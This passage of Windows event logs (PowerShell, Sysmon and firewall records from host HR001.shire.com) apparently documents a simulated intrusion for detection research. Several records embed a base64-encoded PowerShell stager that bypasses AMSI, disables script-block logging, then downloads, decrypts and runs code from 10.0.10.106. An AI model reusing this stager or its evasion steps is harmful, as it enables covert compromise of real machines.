VABFAFgAdAAuAEUATgBDAG8ARABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAFkAVABFAFMAKAAnAH4AawAqAF8ARgBTAGoAcgA4ACUAeAB3AGUASgA2AGgAfABQAEsALgBmAHsAVQBOAE0ASAB1AGQAcAA1AHkAbQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAVAAuAEUATgBjAG8ARABJAG4ARwBdADoAOgBVAG4AaQBjAG8ARABFAC4ARwBFAHQAUwBUAFIASQBOAEcAKABbAEMATwBOAHYARQByAHQAXQA6ADoARgByAE8ATQBCAEEAUwBlADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARABFAEEATQBBAEEAdQBBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATgBnAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADAAOABjAC4ASABlAGEAZABFAHIAUwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AGkAKwBjAHMANQBCAFAARwBjAGEAUgBJAFAAWgA1AGcAMgBOAEQATQBtADUAUQBZAGoAVQBrAD0AIgApADsAJABEAGEAVABhAD0AJAA1ADAAOABjAC4ARABvAFcAbgBsAG8AQQBEAEQAQQB0AEEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAVgA9ACQAZABhAHQAQQBbADAALgAuADMAXQA7ACQARABBAFQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAQQAuAEwARQBOAEcAVABoAF0AOwAtAEoAbwBJAG4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\n        Engine Version = 5.1.17763.316\n        Runspace ID = 5394f09a-82e8-432b-a847-ed46ac75eed1\n        Pipeline ID = 1\n        Command Name = Get-Random\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 71005\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell","Payload":"CommandInvocation(Get-Random): \"Get-Random\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\""},"message":"CommandInvocation(Get-Random): \"Get-Random\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 76b548b3-2221-41d9-8e53-ad5dff2c5c4e\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBlAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAAyADQAMQBmAD0AWwByAEUAZgBdAC4AQQBzAHMAZQBtAEIATAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADIANAAxAEYAKQB7ACQARgAwADkAQQA9ACQAMgA0ADEAZgAuAEcARQB0AFYAQQBMAHUAZQAoACQATgB1AEwATAApADsASQBGACgAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARgAwADkAQQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBsAGwARQBjAHQASQBPAG4AUwAuAEcAZQBOAGUAUgBJAGMALgBEAEkAQwBUAEkATwBOAGEAcgB5AFsAUwBUAFIAaQBOAEcALABTAFkAcwB0AGUAbQAuAE8AQgBKAEUAYwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAEEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGYAMAA5AGEAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAcgBJAHAAdABCAGwATwBDAGsAXQAuACIARwBlAHQARgBJAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAQQBMAHUARQAoACQAbgBVAEwAbAAsACgATgBFAHcALQBPAEIASgBlAEMAVAAgAEMAbwBMAGwARQBjAFQAaQBPAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBIAGEAcwBIAFMARQBUAFsAUwBUAHIAaQBOAGcAXQApACkAfQAkAFIAZQBGAD0AWwBSAEUAZgBdAC4AQQBzAFMAZQBNAGIATABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBsAFUARQAoACQAbgBVAGwATAAsACQAVABSAFUAZQApADsAfQA7AFsAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFMARQByAFYASQBDAEUAUABvAEkATgBUAE0AYQBuAEEARwBlAHIAXQA6ADoARQB4AHAARQBjAFQAMQAwADAAQwBvAE4AVABJAE4AdQBlAD0AMAA7ACQANQAwADgAYwA9AE4AZQBXAC0ATwBCAGoAZQBDAHQAIABTAHkAcwBUAGUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANQAwADgAQwAuAEgAZQBBAGQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUAMAA4AGMALgBIAGUAYQBEAEUAcgBzAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA1ADAAOABjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBlAHEAVQBFAHMAVABdADoAOgBEAGUAZgBhAHUAbAB0AFcARQBCAFAAUgBvAFgAWQA7ACQANQAwADgAYwAuAFAAcgBPAHgAWQAuAEMAUgBFAEQARQBuAFQAaQBBAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAEkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBhAHUATABUAE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AVABJAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADUAMAA4AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAG8ARABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAFkAVABFAFMAKAAnAH4AawAqAF8ARgBTAGoAcgA4ACUAeAB3AGUASgA2AGgAfABQAEsALgBmAHsAVQBOAE0ASAB1AGQAcAA1AHkAbQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAVAAuAEUATgBjAG8ARABJAG4ARwBdADoAOgBVAG4AaQBjAG8ARABFAC4ARwBFAHQAUwBUAFIASQBOAEcAKABbAEMATwBOAHYARQByAHQAXQA6ADoARgByAE8ATQBCAEEAUwBlADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARABFAEEATQBBAEEAdQBBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATgBnAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADAAOABjAC4ASABlAGEAZABFAHIAUwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AGkAKwBjAHMANQBCAFAARwBjAGEAUgBJAFAAWgA1AGcAMgBOAEQATQBtADUAUQBZAGoAVQBrAD0AIgApADsAJABEAGEAVABhAD0AJAA1ADAAOABjAC4ARABvAFcAbgBsAG8AQQBEAEQAQQB0AEEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAVgA9ACQAZABhAHQAQQBbADAALgAuADMAXQA7ACQARABBAFQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAQQAuAEwARQBOAEcAVABoAF0AOwAtAEoAbwBJAG4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\n        Engine Version = 5.1.17763.316\n        Runspace ID = 5394f09a-82e8-432b-a847-ed46ac75eed1\n        Pipeline ID = 1\n        Command Name = Get-Random\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 71005\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:","host":{"name":"WECserver"},"source_name":"Microsoft-Windows-PowerShell","activity_id":"{c93a7728-017f-0000-a6fe-49ca7f01d501}","log_name":"Microsoft-Windows-PowerShell/Operational","computer_name":"HR001.shire.com","opcode":"To be used when operation is just executing a method","task":"Executing Pipeline","type":"wineventlog","version":1,"level":"Information","event_id":4103,"provider_guid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","process_id":5452,"user":{"domain":"SHIRE","type":"User","identifier":"S-1-5-21-2511471446-1103646877-3980648787-1106","name":"nmartha"},"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"record_number":"92757"}
{"@timestamp":"2019-05-18T20:42:59.045Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"level":"Information","computer_name":"HR001.shire.com","event_id":3,"process_id":2440,"event_data":{"UtcTime":"2019-05-07 11:56:15.761","DestinationPort":"443","SourceIsIpv6":"false","User":"SHIRE\\nmartha","DestinationIsIpv6":"false","Protocol":"tcp","Initiated":"true","ProcessGuid":"{03ba39f5-4cfe-5ce0-0000-00103600c001}","SourcePort":"53366","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ProcessId":"5172","SourceIp":"172.18.39.106","SourceHostname":"HR001.shire.com","DestinationPortName":"https","DestinationIp":"10.0.10.106"},"opcode":"Info","version":5,"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","message":"Network connection detected:\nRuleName: \nUtcTime: 2019-05-07 11:56:15.761\nProcessGuid: {03ba39f5-4cfe-5ce0-0000-00103600c001}\nProcessId: 5172\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nUser: SHIRE\\nmartha\nProtocol: tcp\nInitiated: true\nSourceIsIpv6: false\nSourceIp: 172.18.39.106\nSourceHostname: HR001.shire.com\nSourcePort: 53366\nSourcePortName: \nDestinationIsIpv6: false\nDestinationIp: 10.0.10.106\nDestinationHostname: \nDestinationPort: 443\nDestinationPortName: https","record_number":"2237774","thread_id":2368,"user":{"name":"SYSTEM","domain":"NT AUTHORITY","type":"User","identifier":"S-1-5-18"},"source_name":"Microsoft-Windows-Sysmon","host":{"name":"WECserver"},"log_name":"Microsoft-Windows-Sysmon/Operational","task":"Network connection detected (rule: NetworkConnect)","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"type":"wineventlog"}
{"@timestamp":"2019-05-18T20:42:59.050Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"computer_name":"HR001.shire.com","message":"The Windows Filtering Platform has permitted a connection.\n\nApplication Information:\n\tProcess ID:\t\t5452\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\n\nNetwork Information:\n\tDirection:\t\tOutbound\n\tSource Address:\t\t172.18.39.106\n\tSource Port:\t\t53368\n\tDestination Address:\t10.0.10.106\n\tDestination Port:\t\t443\n\tProtocol:\t\t6\n\nFilter Information:\n\tFilter Run-Time ID:\t67557\n\tLayer Name:\t\tConnect\n\tLayer Run-Time ID:\t48","process_id":4,"provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","opcode":"Info","thread_id":1288,"beat":{"version":"6.7.0","name":"WECserver","hostname":"WECserver"},"type":"wineventlog","event_data":{"LayerRTID":"48","Application":"\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe","Protocol":"6","LayerName":"%%14611","RemoteUserID":"S-1-0-0","RemoteMachineID":"S-1-0-0","Direction":"%%14593","SourceAddress":"172.18.39.106","DestPort":"443","SourcePort":"53368","DestAddress":"10.0.10.106","ProcessID":"5452","FilterRTID":"67557"},"keywords":["Audit Success"],"task":"Filtering Platform Connection","host":{"name":"WECserver"},"event_id":5156,"log_name":"Security","record_number":"288246","source_name":"Microsoft-Windows-Security-Auditing","version":1,"level":"Information"}
{"@timestamp":"2019-05-18T20:42:59.070Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"message":"Registry object added or deleted:\nRuleName: \nEventType: CreateKey\nUtcTime: 2019-05-18 20:42:59.034\nProcessGuid: {03ba39f5-50b2-5ce0-0000-00109995c501}\nProcessId: 5452\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetObject: HKU\\S-1-5-21-2511471446-1103646877-3980648787-1106\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","process_id":2440,"host":{"name":"WECserver"},"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"type":"wineventlog","source_name":"Microsoft-Windows-Sysmon","log_name":"Microsoft-Windows-Sysmon/Operational","computer_name":"HR001.shire.com","task":"Registry object added or deleted (rule: RegistryEvent)","thread_id":3144,"record_number":"2237775","user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"event_data":{"UtcTime":"2019-05-18 20:42:59.034","ProcessGuid":"{03ba39f5-50b2-5ce0-0000-00109995c501}","ProcessId":"5452","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetObject":"HKU\\S-1-5-21-2511471446-1103646877-3980648787-1106\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","EventType":"CreateKey"},"opcode":"Info","event_id":12,"version":2,"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","level":"Information"}
{"@timestamp":"2019-05-18T20:42:59.831Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","level":"Information","event_id":3,"process_id":2440,"record_number":"2237776","event_data":{"DestinationIsIpv6":"false","ProcessGuid":"{03ba39f5-652c-5ce0-0000-0010760bff01}","SourceHostname":"HR001.shire.com","SourceIsIpv6":"false","Protocol":"tcp","ProcessId":"7924","SourcePort":"53367","User":"SHIRE\\nmartha","DestinationPortName":"https","Image":"C:\\Windows\\System32\\notepad.exe","UtcTime":"2019-05-07 11:56:16.690","DestinationPort":"443","Initiated":"true","SourceIp":"172.18.39.106","DestinationIp":"10.0.10.106"},"thread_id":2368,"version":5,"type":"wineventlog","source_name":"Microsoft-Windows-Sysmon","message":"Network connection detected:\nRuleName: \nUtcTime: 2019-05-07 11:56:16.690\nProcessGuid: {03ba39f5-652c-5ce0-0000-0010760bff01}\nProcessId: 7924\nImage: C:\\Windows\\System32\\notepad.exe\nUser: SHIRE\\nmartha\nProtocol: tcp\nInitiated: true\nSourceIsIpv6: false\nSourceIp: 172.18.39.106\nSourceHostname: HR001.shire.com\nSourcePort: 53367\nSourcePortName: \nDestinationIsIpv6: false\nDestinationIp: 10.0.10.106\nDestinationHostname: \nDestinationPort: 443\nDestinationPortName: https","opcode":"Info","user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"log_name":"Microsoft-Windows-Sysmon/Operational","computer_name":"HR001.shire.com","beat":{"hostname":"WECserver","version":"6.7.0","name":"WECserver"},"host":{"name":"WECserver"},"task":"Network connection detected (rule: NetworkConnect)"}
{"@timestamp":"2019-05-18T20:43:00.005Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"message":"Process accessed:\nRuleName: \nUtcTime: 2019-05-18 20:43:00.003\nSourceProcessGUID: {03ba39f5-ea63-5ccb-0000-0010edea0000}\nSourceProcessId: 832\nSourceThreadId: 6996\nSourceImage: C:\\Windows\\system32\\svchost.exe\nTargetProcessGUID: {03ba39f5-ea6b-5ccb-0000-0010732c0200}\nTargetProcessId: 2388\nTargetImage: C:\\Windows\\System32\\svchost.exe\nGrantedAccess: 0x1000\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9fb54|C:\\Windows\\System32\\KERNELBASE.dll+6b815|c:\\windows\\system32\\lsm.dll+e575|C:\\Windows\\System32\\RPCRT4.dll+77803|C:\\Windows\\System32\\RPCRT4.dll+db4a6|C:\\Windows\\System32\\RPCRT4.dll+10d20|C:\\Windows\\System32\\RPCRT4.dll+54a38|C:\\Windows\\System32\\RPCRT4.dll+304b0|C:\\Windows\\System32\\RPCRT4.dll+2fe5b|C:\\Windows\\System32\\RPCRT4.dll+221ff|C:\\Windows\\System32\\RPCRT4.dll+2165a|C:\\Windows\\System32\\RPCRT4.dll+20c21|C:\\Windows\\System32\\RPCRT4.dll+20692|C:\\Windows\\System32\\RPCRT4.dll+17465|C:\\Windows\\SYSTEM32\\ntdll.dll+4f4c0|C:\\Windows\\SYSTEM32\\ntdll.dll+50348|C:\\Windows\\System32\\KERNEL32.DLL+17974|C:\\Windows\\SYSTEM32\\ntdll.dll+6a271","record_number":"2237777","event_data":{"GrantedAccess":"0x1000","SourceImage":"C:\\Windows\\system32\\svchost.exe","TargetImage":"C:\\Windows\\System32\\svchost.exe","SourceThreadId":"6996","TargetProcessGUID":"{03ba39f5-ea6b-5ccb-0000-0010732c0200}","TargetProcessId":"2388","CallTrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+9fb54|C:\\Windows\\System32\\KERNELBASE.dll+6b815|c:\\windows\\system32\\lsm.dll+e575|C:\\Windows\\System32\\RPCRT4.dll+77803|C:\\Windows\\System32\\RPCRT4.dll+db4a6|C:\\Windows\\System32\\RPCRT4.dll+10d20|C:\\Windows\\System32\\RPCRT4.dll+54a38|C:\\Windows\\System32\\RPCRT4.dll+304b0|C:\\Windows\\System32\\RPCRT4.dll+2fe5b|C:\\Windows\\System32\\RPCRT4.dll+221ff|C:\\Windows\\System32\\RPCRT4.dll+2165a|C:\\Windows\\System32\\RPCRT4.dll+20c21|C:\\Windows\\System32\\RPCRT4.dll+20692|C:\\Windows\\System32\\RPCRT4.dll+17465|C:\\Windows\\SYSTEM32\\ntdll.dll+4f4c0|C:\\Windows\\SYSTEM32\\ntdll.dll+50348|C:\\Windows\\System32\\KERNEL32.DLL+17974|C:\\Windows\\SYSTEM32\\ntdll.dll+6a271","UtcTime":"2019-05-18 20:43:00.003","SourceProcessGUID":"{03ba39f5-ea63-5ccb-0000-0010edea0000}","SourceProcessId":"832"},"source_name":"Microsoft-Windows-Sysmon","level":"Information","thread_id":3144,"event_id":10,"opcode":"Info","host":{"name":"WECserver"},"log_name":"Microsoft-Windows-Sysmon/Operational","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","version":3,"type":"wineventlog","computer_name":"HR001.shire.com","task":"Process accessed (rule: ProcessAccess)","process_id":2440,"user":{"name":"SYSTEM","domain":"NT AUTHORITY","type":"User","identifier":"S-1-5-18"}}
{"@timestamp":"2019-05-18T20:43:00.007Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"user":{"domain":"NT AUTHORITY","type":"User","identifier":"S-1-5-18","name":"SYSTEM"},"event_data":{"TargetProcessGUID":"{03ba39f5-ea6b-5ccb-0000-0010732c0200}","TargetProcessId":"2388","SourceProcessGUID":"{03ba39f5-ea63-5ccb-0000-0010edea0000}","SourceProcessId":"832","TargetImage":"C:\\Windows\\System32\\svchost.exe","SourceThreadId":"6996","UtcTime":"2019-05-18 20:43:00.003","SourceImage":"C:\\Windows\\system32\\svchost.exe","GrantedAccess":"0x1000","CallTrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+9fb54|C:\\Windows\\System32\\KERNELBASE.dll+6b815|c:\\windows\\system32\\lsm.dll+ebf0|C:\\Windows\\System32\\RPCRT4.dll+77803|C:\\Windows\\System32\\RPCRT4.dll+db4a6|C:\\Windows\\System32\\RPCRT4.dll+10d20|C:\\Windows\\System32\\RPCRT4.dll+54a38|C:\\Windows\\System32\\RPCRT4.dll+304b0|C:\\Windows\\System32\\RPCRT4.dll+2fe5b|C:\\Windows\\System32\\RPCRT4.dll+221ff|C:\\Windows\\System32\\RPCRT4.dll+2165a|C:\\Windows\\System32\\RPCRT4.dll+20c21|C:\\Windows\\System32\\RPCRT4.dll+20692|C:\\Windows\\System32\\RPCRT4.dll+17465|C:\\Windows\\SYSTEM32\\ntdll.dll+4f4c0|C:\\Windows\\SYSTEM32\\ntdll.dll+50348|C:\\Windows\\System32\\KERNEL32.DLL+17974|C:\\Windows\\SYSTEM32\\ntdll.dll+6a271"},"event_id":10,"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","computer_name":"HR001.shire.com","task":"Process accessed (rule: ProcessAccess)","thread_id":3144,"source_name":"Microsoft-Windows-Sysmon","process_id":2440,"level":"Information","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"type":"wineventlog","record_number":"2237778","opcode":"Info","version":3,"message":"Process accessed:\nRuleName: \nUtcTime: 2019-05-18 20:43:00.003\nSourceProcessGUID: {03ba39f5-ea63-5ccb-0000-0010edea0000}\nSourceProcessId: 832\nSourceThreadId: 6996\nSourceImage: C:\\Windows\\system32\\svchost.exe\nTargetProcessGUID: {03ba39f5-ea6b-5ccb-0000-0010732c0200}\nTargetProcessId: 2388\nTargetImage: C:\\Windows\\System32\\svchost.exe\nGrantedAccess: 0x1000\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9fb54|C:\\Windows\\System32\\KERNELBASE.dll+6b815|c:\\windows\\system32\\lsm.dll+ebf0|C:\\Windows\\System32\\RPCRT4.dll+77803|C:\\Windows\\System32\\RPCRT4.dll+db4a6|C:\\Windows\\System32\\RPCRT4.dll+10d20|C:\\Windows\\System32\\RPCRT4.dll+54a38|C:\\Windows\\System32\\RPCRT4.dll+304b0|C:\\Windows\\System32\\RPCRT4.dll+2fe5b|C:\\Windows\\System32\\RPCRT4.dll+221ff|C:\\Windows\\System32\\RPCRT4.dll+2165a|C:\\Windows\\System32\\RPCRT4.dll+20c21|C:\\Windows\\System32\\RPCRT4.dll+20692|C:\\Windows\\System32\\RPCRT4.dll+17465|C:\\Windows\\SYSTEM32\\ntdll.dll+4f4c0|C:\\Windows\\SYSTEM32\\ntdll.dll+50348|C:\\Windows\\System32\\KERNEL32.DLL+17974|C:\\Windows\\SYSTEM32\\ntdll.dll+6a271","log_name":"Microsoft-Windows-Sysmon/Operational","host":{"name":"WECserver"}}
{"@timestamp":"2019-05-18T20:43:00.007Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"event_data":{"SourceThreadId":"6996","TargetProcessId":"2388","UtcTime":"2019-05-18 